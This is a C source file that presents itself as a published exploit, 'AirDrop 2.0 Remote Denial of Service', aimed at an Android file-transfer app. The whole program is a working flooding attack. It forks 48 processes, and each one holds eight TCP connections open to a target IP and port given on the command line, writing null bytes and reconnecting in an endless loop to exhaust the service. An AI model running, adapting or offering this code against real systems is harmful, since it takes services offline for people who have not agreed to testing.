#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// ************************************************************************
// *                Author: Marcelo Vázquez (aka s4vitar)                 *
// *             AirDrop 2.0 Remote Denial of Service (DoS)               *
// ************************************************************************

// Exploit Title: AirDrop 2.0 Remote Denial of Service (DoS)
// Date: 2019-02-21
// Exploit Author: Marcelo Vázquez (aka s4vitar)
// Vendor Homepage: https://support.apple.com/en-us/HT204144
// Software Link: https://apkpure.com/airdrop-wifi-file-transfer/com.airdrop.airdroid.shareit.xender.filetransfer
// Version: <= AirDrop 2.0
// Tested on: Android

int make_socket(char *host, char *port) {
    struct addrinfo hints, *servinfo, *p;
    int sock, r;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
        exit(0);
    }
    for(p = servinfo; p != NULL; p = p->ai_next) {
        if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            continue;
        }
        if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
            close(sock);
            continue;
        }
        break;
    }
    if(p == NULL) {
        if(servinfo)
            freeaddrinfo(servinfo);
        fprintf(stderr, "No connection could be made\n");
        exit(0);
    }
    if(servinfo)
        freeaddrinfo(servinfo);
    fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
    return sock;
}

void broke(int s) {
    // Nothing to do
}

#define CONNECTIONS 8
#define THREADS 48

void attack(char *host, char *port, int id) {
    int sockets[CONNECTIONS];
    int x, g=1, r;
    for(x=0; x!= CONNECTIONS; x++)
        sockets[x]=0;
    signal(SIGPIPE, &broke);
    while(1) {
        for(x=0; x != CONNECTIONS; x++) {
            if(sockets[x] == 0)
                sockets[x] = make_socket(host, port);
            r=write(sockets[x], "\0", 1);
            if(r == -1) {
                close(sockets[x]);
                sockets[x] = make_socket(host, port);
            }
        }
        usleep(300000);
    }
}

int main(int argc, char **argv) {

    int x;

    if (argc < 3) {
        printf("Usage: ./AirDrop_DoS <ip-address> <port>\n");
        exit(-1);
}

    for(x=0; x != THREADS; x++) {
        if(fork())
            attack(argv[1], argv[2], x);
        usleep(200000);
    }
    getc(stdin);
    return 0;
}